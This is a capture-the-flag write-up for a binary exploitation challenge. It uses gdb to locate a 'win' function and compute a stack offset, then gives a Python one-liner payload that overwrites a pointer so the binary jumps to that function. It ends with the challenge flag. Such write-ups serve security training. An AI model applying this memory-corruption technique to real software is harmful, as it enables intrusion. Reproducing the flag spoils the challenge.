#### Challenge:

You don't need eip control for every pwn. [q2](./q2 ':ignore') Service : `nc 68.183.158.95 8990`

---

#### Solution:

![disassembly.png](./disassembly.png ':ignore')

```console
(gdb) print win
$2 = {<text variable, no debug info>} 0x400831 <win>
(gdb) b *0x004009a2
(gdb) r
(gdb) x/x $rax
0x7fffffffda20:	0x00000000
(gdb) x/x $rbp-0x40
0x7fffffffda10:	0x00400817
(gdb) p ($rbp-0x40) - $rax
$7 = (void *) 0xfffffffffffffff0
(gdb) x/8x $rbp-0x50
0x7fffffffda00:	0x00400831	0x41414141	0x41414141	0xfffffffe
0x7fffffffda10:	0x00400800	0x00000000	0x00400a6d	0x00000000
```

```python
# hex( ( $rbp-0x40 - $rax & 0xffffffffffffffff ) >> 3 & 0xffffffffffffffff )
hex( ( 0x7fffffffda10 - 0x7fffffffda20 & 0xffffffffffffffff ) >> 3 & 0xffffffffffffffff )
```

```bash
python -c "import struct; print struct.pack('<I', 0x400831) + 'A' * 8 + struct.pack('<I',0xFFFFFFFE)" | ./q2
```

---

<details><summary>FLAG:</summary>

```
d4rk{B0fs_4r3_3zzzz}c0de
```

</details>